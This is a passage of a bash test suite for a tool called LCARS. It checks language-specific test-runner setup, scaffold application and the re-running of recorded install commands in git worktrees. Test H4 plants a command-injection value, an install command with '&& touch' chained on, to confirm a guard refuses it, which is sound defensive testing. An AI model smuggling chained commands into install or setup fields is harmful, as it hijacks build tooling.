  printf "require 'minitest/autorun'\n\nclass AddTest < Minitest::Test\n  def test_add\n    assert_equal 2, 1 + 1\n  end\nend\n" > "$d/test/add_test.rb"
  if ( cd "$d" && ruby -Itest test/add_test.rb >/dev/null 2>&1 ); then
    ok "E4b. REAL ruby: the standard-library runner runs the seeded test"
  else
    bad "E4b. the real minitest leg failed"
  fi
  v="$(fnd "$d")"
  case "$v" in unconfigured*|ready*) ok "E4c. …and the oracle sees the ruby test file" ;;
    *) bad "E4c. a real minitest suite read as '${v%%	*}'" ;; esac
else
  skip "E4. ruby — no ruby on this machine (transcript only)"
fi

# E5. PYTHON — the settled fork. `pip install pytest` HARD-FAILS on a
#     PEP-668-managed interpreter (measured on this machine), so the RECIPE the
#     PRD recommends is the standard library's runner, which needs no install at
#     all. The TABLE still admits pip/uv/poetry: what is PERMITTED and what is
#     RECOMMENDED are different questions, and plenty of machines have a venv.
if command -v python3 >/dev/null 2>&1; then
  repo="$(new_mission_repo python)"
  allow="$(allow_for "$repo" | sed -n 's/^ALLOW=//p' | tail -1)"
  if printf '%s' "pip install pytest" | grep -Eq "$allow" \
     && printf '%s' "uv add --dev pytest" | grep -Eq "$allow"; then
    ok "E5a. the python arm still PERMITS pip/uv installs"
  else
    bad "E5a. the python arm refuses a legitimate python install"
  fi
  d="$(mk realpy)"
  mkdir -p "$d/tests"
  printf 'import unittest\n\nclass T(unittest.TestCase):\n    def test_add(self):\n        self.assertEqual(1 + 1, 2)\n' > "$d/tests/test_add.py"
  if ( cd "$d" && python3 -m unittest discover -s tests >/dev/null 2>&1 ); then
    ok "E5b. REAL python3: the standard-library runner runs with ZERO install"
  else
    bad "E5b. python3 -m unittest failed on the seeded test"
  fi
  v="$(fnd "$d")"
  case "$v" in unconfigured*|ready*) ok "E5c. …and the oracle sees the python test file" ;;
    *) bad "E5c. a real unittest suite read as '${v%%	*}'" ;; esac
else
  skip "E5. python — no python3 on this machine (transcript only)"
fi

# E6. JVM — CANNOT BE EXECUTED HERE and does not pretend otherwise. The table
#     entries and the cross-arm refusals are pure string logic (proven in A);
#     the toolchain leg is honestly skipped.
if command -v gradle >/dev/null 2>&1 || command -v mvn >/dev/null 2>&1; then
  d="$(mk realjvm)"
  if ( cd "$d" && gradle init --type java-library --dsl groovy --test-framework junit-jupiter --project-name probe >/dev/null 2>&1 ); then
    ok "E6. REAL gradle: the build tool's own init seeds a test source set"
  else
    bad "E6. gradle init failed"
  fi
else
  skip "E6. jvm — no java/gradle/mvn on this machine: TRANSCRIPT ONLY, string logic proven in A"
fi

echo "== F. the scaffold arm SUCCEEDS end to end on a zero-install arm =="

# Behaviour 4, all the way through the REAL apply_declared_setup rather than the
# refusal side of it: on rust / go / ruby the scaffold ticket declares FILES and
# NO install command at all, and the arm must still complete — because completing
# means LCARS can DETECT a runner at the root afterwards, which is what gives
# ticket 2 of the same mission a real flip-flop gate instead of a waiver.
#
# Nothing here is stubbed: real `git init`, the real manifest a scaffold ticket
# would add, the real detector, the real apply path. No network, no install, no
# worker.
scaffold_ok() { # arm  setup-dir  wanted-command-fragment  label  [in-tree-seed-fn]
  local a="$1" sd="$2" want="$3" label="$4" seed="${5:-}"
  local repo; repo="$(new_mission_repo_bare "$a")"
  [ -n "$seed" ] && "$seed" "$repo"
  printf '{ "package": "", "gap": "this repo has no test system", "installCommand": "" }\n' \
    > "$TMPROOT/mf-scaffold-$a.json"
  apply_setup "$repo" "$TMPROOT/mf-scaffold-$a.json" "$sd" "" LCARS_SETUP_GREENFIELD=1
  if [ "$ASRC" = 0 ]; then
    ok "$label"
  else
    bad "$label — REFUSED (note: $ASNOTE)"
    return 1
  fi
  local cmd
  cmd="$( cd "$repo" && env LCARS_GP_ROOT="$repo" bash "$SCRIPT" greenfield-detect-cmd-test 2>&1 \
          | sed -n 's/^DETECTED=//p' | tail -1 )"
  if printf '%s' "$cmd" | grep -q "$want"; then
    ok "     …and LCARS now detects \`$cmd\` at the root — ticket 2 gets a real gate"
  else
    bad "     …but no runner is detectable afterwards (got '$cmd')"
  fi
}
# A repo with NO stack marker of its own: the scaffold ticket is the thing that
# makes it one, exactly as on the captain's day-zero repo.
new_mission_repo_bare() { # arm → a blank repo carrying an initialization mission
  local r; r="$(mktemp -d "$TMPROOT/scaf.XXXX")"
  ( cd "$r" && git init -q && git config user.email t@t && git config user.name t \
      && printf '# ctx\n' > CONTEXT.md && git add -A && git commit -qm init )
  mkdir -p "$r/.git/lcars/missions/m-001/tickets/t-scaffold"
  cat > "$r/.git/lcars/missions/m-001/state.json" <<'JSON'
{ "id": "m-001", "type": "feature", "title": "t", "stage": "implement",
  "missionType": "initialization" }
JSON
  cat > "$r/.git/lcars/missions/m-001/approved-plan.json" <<'JSON'
{ "tickets": [ { "id": "t-scaffold", "title": "establish the test system",
                 "description": "d", "acceptanceCriteria": ["a runner runs"] } ] }
JSON
  printf '%s' "$r"
}

# THE RUST SHAPE IS NOT THE OBVIOUS ONE, and this is worth stating because it
# would otherwise be discovered live. Rust's most common unit-test convention is
# `#[cfg(test)] mod tests` INSIDE the source file — and a declared setup may
# NEVER add anything under `src/` (an invariant, not a bug: declared setup adds
# TEST infrastructure, never source, and that is what stops a "test system"
# declaration from smuggling in product code). So on this arm the declared setup
# is the manifest plus a test in Cargo's INTEGRATION test directory, which lives
# outside `src/`; the skeleton itself is the worker's own in-tree work, exactly
# as on every other arm.
seed_rust_src() { mkdir -p "$1/src"; printf 'pub fn add(a: i32) -> i32 { a + 1 }\n' > "$1/src/lib.rs"; }
sd="$TMPROOT/scaf-rust"; mkdir -p "$sd/tests"
printf '[package]\nname = "app"\nversion = "0.1.0"\nedition = "2021"\n' > "$sd/Cargo.toml"
printf 'use app::add;\n\n#[test]\nfn adds() { assert_eq!(add(1), 2); }\n' > "$sd/tests/basic.rs"
scaffold_ok rust "$sd" 'cargo test' \
  "F1. rust: a scaffold declaring files and NO install command is APPLIED" seed_rust_src

# …and the src/ invariant STILL holds on this arm — a rust scaffold that tries to
# declare its inline-test source file is refused, with the invariant's own words.
sd="$TMPROOT/scaf-rust-src"; mkdir -p "$sd/src"
printf '[package]\nname = "app"\n' > "$sd/Cargo.toml"
printf 'pub fn add(a: i32) -> i32 { a + 1 }\n\n#[cfg(test)]\nmod t { #[test] fn x() {} }\n' > "$sd/src/lib.rs"
repo="$(new_mission_repo_bare rust)"
printf '{ "package": "", "gap": "g", "installCommand": "" }\n' > "$TMPROOT/mf-rust-src.json"
apply_setup "$repo" "$TMPROOT/mf-rust-src.json" "$sd" "" LCARS_SETUP_GREENFIELD=1
if [ "$ASRC" != 0 ] && printf '%s' "$ASNOTE" | grep -q 'src/'; then
  ok "F1b. …and the never-src/ invariant still holds on the rust arm"
else
  bad "F1b. the rust arm was let through src/ (rc=$ASRC note=$ASNOTE)"
fi

sd="$TMPROOT/scaf-go"; mkdir -p "$sd"
printf 'module app\n\ngo 1.21\n' > "$sd/go.mod"
printf 'package app\n\nfunc Add(a int) int { return a + 1 }\n' > "$sd/app.go"
printf 'package app\n\nimport "testing"\n\nfunc TestAdd(t *testing.T) {\n  if Add(1) != 2 { t.Fatal("no") }\n}\n' > "$sd/app_test.go"
scaffold_ok go "$sd" 'go test' \
  "F2. go: same — the toolchain's runner needs nothing installed"

sd="$TMPROOT/scaf-ruby"; mkdir -p "$sd/test"
printf 'require "rake/testtask"\n\nRake::TestTask.new do |t|\n  t.libs << "test"\nend\n' > "$sd/Rakefile"
printf "require 'minitest/autorun'\n\nclass AddTest < Minitest::Test\n  def test_add\n    assert_equal 2, 1 + 1\n  end\nend\n" > "$sd/test/add_test.rb"
scaffold_ok ruby "$sd" 'rake test' \
  "F3. ruby: a minitest scaffold (the CHOICE made and named) is APPLIED"

echo "== H. the gate-worktree RE-APPLY reads the SAME table =="

# S186 FIX ROUND 1 — THE SECOND CALL SITE. `setup_reapply_in_worktree` re-runs a
# mission's already-verified declared install inside a FRESH gate worktree
# (post-commit / full-suite / reconcile) so those gates judge the SAME
# provisioned environment the red gate did. It carried its OWN copy of the
# pre-S186 hardcoded JS pattern, so on every install-needing NON-JS arm — dotnet
# restore, bundle install, gradle — the recorded command could not match, the
# guard `|| return 0` returned SUCCESS, and the re-install was SILENTLY SKIPPED.
# The gate worktree then has no runner and the gate misjudges the environment:
# the exact failure this function was written to prevent, resurrected for five of
# the six arms S186 added. It is silent AND it returns 0, which is why 95 green
# tests never saw it.
#
# Nothing here is stubbed but the package managers themselves: a real git repo, a
# real `git worktree add`, the real record the apply path writes, and the real
# function. The PATH shims exist so "was the install actually re-run" is a FILE
# ON DISK rather than an exit code — the same reason setup_ensure_runner refuses
# to trust exit codes.
BINSHIM="$TMPROOT/binshim"; mkdir -p "$BINSHIM"
for b in dotnet bundle gem npm pnpm cargo go gradle; do
  cat > "$BINSHIM/$b" <<'SH'
#!/usr/bin/env bash
printf '%s %s\n' "$(basename "$0")" "$*" >> "${LCARS_TEST_MARK:-/dev/null}"
exit 0
SH
  chmod +x "$BINSHIM/$b"
done

reapply_fixture() { # arm  recorded-installCommand → RREPO / RWT / RMARK
  local a="$1" ic="$2"
  RREPO="$(mktemp -d "$TMPROOT/re-$a.XXXX")"
  ( cd "$RREPO" && git init -q && git config user.email t@t && git config user.name t )
  arm_marker_body "$a" > "$RREPO/$(arm_marker_file "$a")"
  ( cd "$RREPO" && printf '# ctx\n' > CONTEXT.md && git add -A && git commit -qm init )
  mkdir -p "$RREPO/.git/lcars/missions/m-001/tickets/t-scaffold"
  cat > "$RREPO/.git/lcars/missions/m-001/state.json" <<'JSON'
{ "id": "m-001", "type": "feature", "title": "t", "stage": "implement",
  "missionType": "initialization" }
JSON
  # The record the REAL apply path writes: a copy of the accepted manifest.
  printf '{ "package": "", "gap": "no runner", "installCommand": "%s" }\n' "$ic" \
    > "$RREPO/.git/lcars/missions/m-001/test-setup-applied.json"
  RWT="$TMPROOT/wt-$a.$RANDOM"
  ( cd "$RREPO" && git worktree add -q --detach "$RWT" HEAD >/dev/null 2>&1 )
  RMARK="$TMPROOT/mark-$a.$RANDOM"; : > "$RMARK"
}
reapply() { # → ROUT / RRC
  ROUT="$( cd "$RREPO" && env PATH="$BINSHIM:$SHIM:$PATH" LCARS_TEST_MARK="$RMARK" \
            LCARS_GH_BIN=true LCARS_GIT_BIN=git \
            bash "$SCRIPT" setup-reapply-test --mission m-001 "$RWT" 2>&1 )"
  RRC="$(printf '%s\n' "$ROUT" | sed -n 's/^SRRC=//p' | tail -1)"
}
rrefusals() { # → how many refusal events this mission logged
  local f="$RREPO/.git/lcars/missions/m-001/events.jsonl"
  [ -f "$f" ] || { printf 0; return 0; }
  grep -c 'test_setup_reapply_refused' "$f" | head -1
}

# H1 / H2. THE REGRESSION ITSELF. An install-needing non-JS arm's RECORDED
#          command must actually be re-applied in the gate worktree.
reapply_fixture dotnet 'dotnet restore'
reapply
if [ "$RRC" = 0 ] && grep -q '^dotnet restore' "$RMARK"; then
  ok "H1. a recorded \`dotnet restore\` IS re-applied in the gate worktree"
else
  bad "H1. the dotnet re-apply was SKIPPED (rc=$RRC, ran: $(tr '\n' ';' < "$RMARK"))"
fi

reapply_fixture ruby 'bundle install'
reapply
if [ "$RRC" = 0 ] && grep -q '^bundle install' "$RMARK"; then
  ok "H2. …and a recorded \`bundle install\` on the ruby arm"
else
  bad "H2. the ruby re-apply was SKIPPED (rc=$RRC, ran: $(tr '\n' ';' < "$RMARK"))"
fi

# H3. THE JS ARM IS UNCHANGED — the row this site already honoured still runs.
reapply_fixture js 'npm install --save-dev vitest'
reapply
if [ "$RRC" = 0 ] && grep -q '^npm install --save-dev vitest' "$RMARK"; then
  ok "H3. the js arm's re-apply is unchanged"
else
  bad "H3. the js re-apply REGRESSED (rc=$RRC, ran: $(tr '\n' ';' < "$RMARK"))"
fi

# H4. THE TWO VALIDATIONS ARE SYMMETRIC. This site re-reads a command from a
#     file on disk and hands it to `bash -c`, so the S185 metacharacter guard
#     must hold here too: a record whose first token is admissible but which
#     chains a second command is REFUSED, and — provably — NOT EXECUTED.
PWNED="$TMPROOT/pwned-reapply.$$"; rm -f "$PWNED"
reapply_fixture js "npm install --save-dev vitest && touch $PWNED"
reapply
if [ "$RRC" = 0 ] && [ ! -e "$PWNED" ] && [ ! -s "$RMARK" ] && [ "$(rrefusals)" != 0 ]; then
  ok "H4. a chained recorded install is REFUSED, NOT EXECUTED, and logged"
else
  bad "H4. metacharacter guard missing at the re-apply site (rc=$RRC pwned=$([ -e "$PWNED" ] && echo yes || echo no) ran: $(tr '\n' ';' < "$RMARK") events=$(rrefusals))"
fi

# H5. A record that does NOT match the worktree's arm is refused OUT LOUD — the
#     old silent `|| return 0` left a human nothing to read.
reapply_fixture rust 'npm install --save-dev vitest'
reapply
if [ "$RRC" = 0 ] && [ ! -s "$RMARK" ] && [ "$(rrefusals)" != 0 ]; then
  ok "H5. an off-arm recorded install is refused WITH an event, never silently"
else
  bad "H5. the off-arm refusal is still silent (rc=$RRC ran: $(tr '\n' ';' < "$RMARK") events=$(rrefusals))"
fi

# H6. A ZERO-INSTALL ARM still returns early and harmlessly: nothing recorded to
#     run, nothing run, nothing to complain about.
reapply_fixture rust ''
reapply
if [ "$RRC" = 0 ] && [ ! -s "$RMARK" ] && [ "$(rrefusals)" = 0 ]; then
  ok "H6. a zero-install arm returns early, runs nothing, logs no refusal"
else
  bad "H6. the zero-install early return changed (rc=$RRC ran: $(tr '\n' ';' < "$RMARK") events=$(rrefusals))"
fi

# ===========================================================================
# G. ZERO SPEND
# ===========================================================================
n="$(grep -c '^SPAWN' "$SPEND_LOG" 2>/dev/null | head -1)"
if [ "${n:-0}" = "0" ]; then
  ok "G1. ZERO worker spend across the whole suite (counting shim saw 0 spawns)"
else
  bad "G1. the suite SPAWNED $n worker(s) — money leaked"
fi

printf '\nstack-arms: %d passed, %d failed, %d skipped\n' "$PASS" "$FAIL" "$SKIP"
[ "$FAIL" -eq 0 ]
